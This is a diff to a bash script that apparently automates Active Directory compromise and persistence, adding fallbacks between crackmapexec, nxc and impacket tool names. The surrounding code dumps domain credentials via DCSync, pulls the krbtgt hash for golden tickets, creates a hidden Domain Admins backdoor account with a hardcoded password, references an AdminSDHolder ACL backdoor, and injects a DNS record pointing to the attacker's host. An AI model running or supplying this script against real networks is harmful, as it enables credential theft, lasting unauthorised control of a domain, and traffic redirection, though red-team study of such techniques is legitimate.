@@ -10,6 +10,13 @@ ADMIN="${3:?}"
 PASS="${4:?}"
 LHOST="${5:-$(hostname -I | awk '{print $1}')}"
 
+# nxc (netexec) replaced crackmapexec on Kali 2024.1+; fall back gracefully
+CME=""
+for _try in nxc netexec crackmapexec cme; do
+    if command -v "$_try" &>/dev/null; then CME="$_try"; break; fi
+done
+[[ -z "$CME" ]] && echo "[!] Warning: no crackmapexec/nxc found — AD steps that use it will be skipped"
+
 FQDN="${DOMAIN^^}"   # uppercase for Kerberos
 OUTPUT_DIR="./ad_loot_${TARGET}"
 mkdir -p "$OUTPUT_DIR"
@@ -29,8 +36,15 @@ impacket-secretsdump "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" \
 
 # Extract krbtgt hash for golden ticket
 KRBTGT_HASH=$(grep -i "krbtgt:" "${OUTPUT_DIR}/dcsync.ntds" 2>/dev/null | head -1 | cut -d: -f4)
-DOMAIN_SID=$(impacket-getPac "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" 2>/dev/null \
-    | grep "Domain SID" | awk '{print $NF}' | tr -d '[:space:]')
+# impacket-getPac was renamed impacket-getpac on some Kali builds; try both
+_getpac=""
+for _try in impacket-getPac impacket-getpac; do
+    command -v "$_try" &>/dev/null && _getpac="$_try" && break
+done
+if [[ -n "$_getpac" ]]; then
+    DOMAIN_SID=$("$_getpac" "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" 2>/dev/null \
+        | grep "Domain SID" | awk '{print $NF}' | tr -d '[:space:]')
+fi
 
 if [[ -n "$KRBTGT_HASH" ]]; then
     echo "[+] krbtgt NTLM hash: $KRBTGT_HASH"
@@ -65,14 +79,16 @@ echo "[*] [3/5] Creating backdoor domain admin account..."
 BD_USER="svc_healthmon"
 BD_PASS="P@ssw0rd_Rt2025!"
 
-# Use net rpc or impacket-addcomputer approach via CME
-crackmapexec smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
-    --execute "net user ${BD_USER} '${BD_PASS}' /add /domain && \
-               net group 'Domain Admins' ${BD_USER} /add /domain && \
-               net localgroup Administrators ${BD_USER} /add" \
-    2>/dev/null \
-    && echo "[+] Backdoor account: ${BD_USER} / ${BD_PASS}  (Domain Admins)" \
-    || echo "[-] Backdoor account creation failed"
+# Use net rpc or impacket-addcomputer approach via CME/nxc
+if [[ -n "$CME" ]]; then
+    "$CME" smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
+        -x "net user ${BD_USER} ${BD_PASS} /add /domain & net group \"Domain Admins\" ${BD_USER} /add /domain & net localgroup Administrators ${BD_USER} /add" \
+        2>/dev/null \
+        && echo "[+] Backdoor account: ${BD_USER} / ${BD_PASS}  (Domain Admins)" \
+        || echo "[-] Backdoor account creation failed"
+else
+    echo "[-] Skipping account creation — no CME/nxc available"
+fi
 
 # ── Step 4: AdminSDHolder ACL backdoor ────────────────────────────────────────
 echo ""
@@ -102,11 +118,15 @@ try:
 except: pass
 " 2>/dev/null
 
-crackmapexec smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
-    --execute "dnscmd /RecordAdd ${DOMAIN} svcupdate A ${LHOST}" \
-    2>/dev/null \
-    && echo "[+] DNS record added: svcupdate.${DOMAIN} -> ${LHOST}" \
-    || echo "[-] DNS record injection failed"
+if [[ -n "$CME" ]]; then
+    "$CME" smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
+        -x "dnscmd /RecordAdd ${DOMAIN} svcupdate A ${LHOST}" \
+        2>/dev/null \
+        && echo "[+] DNS record added: svcupdate.${DOMAIN} -> ${LHOST}" \
+        || echo "[-] DNS record injection failed"
+else
+    echo "[-] Skipping DNS injection — no CME/nxc available"
+fi
 
 echo ""
 echo "[*] === AD Persistence Summary ==="
